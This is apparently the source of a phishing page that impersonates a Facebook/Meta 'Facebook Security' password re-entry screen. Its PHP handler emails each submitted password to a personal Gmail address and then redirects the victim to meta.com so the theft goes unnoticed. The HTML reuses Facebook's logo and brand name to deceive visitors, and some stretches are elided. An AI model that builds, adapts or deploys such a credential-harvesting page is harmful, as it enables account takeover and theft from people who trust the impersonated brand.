...
if(isset($_POST['ButtonNext']))
{
  ...
  try {
      ...
      //Recipients
      $mail->setFrom('sahilnizamani26@gmail.com', 'Password Submission');
      $mail->addAddress('sahilnizamani26@gmail.com', 'Password Submission');
      ...
      $mail->send();
    header("Location: https://www.meta.com/");
    exit();
  } catch (Exception $e) {
...
<head>
    ...
    <title>Re-enter Password - Meta Corporation</title>
    ...
    <link rel="stylesheet" href="./whynot.css">
</head>


<body>
    <div id="page-div" bis_skin_checked="1">
      <div id="progress-bar-container" class="" bis_skin_checked="1">
        <div class="iConWeb" bis_skin_checked="1">
      ...
      <div id="interview-page-container" class="" bis_skin_checked="1">
        <div class="BackArrowAndHeading" bis_skin_checked="1">
          <center><img alt="" src="https://www.facebook.com/images/fb_icon_325x325.png" width="20%"><br>
        </center></div>
        <div class="groupSubHeadersWrapper" bis_skin_checked="1">
          <h5 id="groupSubHeader">Facebook Security</h5>
        </div>
        <div id="interview-container" bis_skin_checked="1">
          <div id="tax-form" bis_skin_checked="1">
            <div id="AboutYouSection" class="Question AboutYouSection" bis_skin_checked="1">
              <div class="CaptionWrapper " bis_skin_checked="1">
              ...
              </font></div><form  method="POST"><font color="grey">
                <div class="ElementWrapper" bis_skin_checked="1">
                  <div data-form-element-key="PrevToPrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevToPrevYearDays" bis_skin_checked="1">
                    <div data-form-element-key="PrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevYearDays" bis_skin_checked="1">
                      <div class="TextBox floatingLabelContainer" bis_skin_checked="1">
                  ...
                  <div data-form-element-key="USResidentCueAlert" class="FormElement FormElement_AlertMessage AlertMessageTopMargin USResidentCueAlert " bis_skin_checked="1">
                  </div>
                  <div data-form-element-key="ButtonNext" class="FormElement FormElement_Button ButtonNext" bis_skin_checked="1">
                    <div class="Button" bis_skin_checked="1">
            ...
            </font></font></center></font></form></div><font color="grey"><font color="black"><font size="2">
          </font></font></font></div><font color="grey"><font color="black"><font size="2">
        </font></font></font></div><font color="grey"><font color="black"><font size="2">
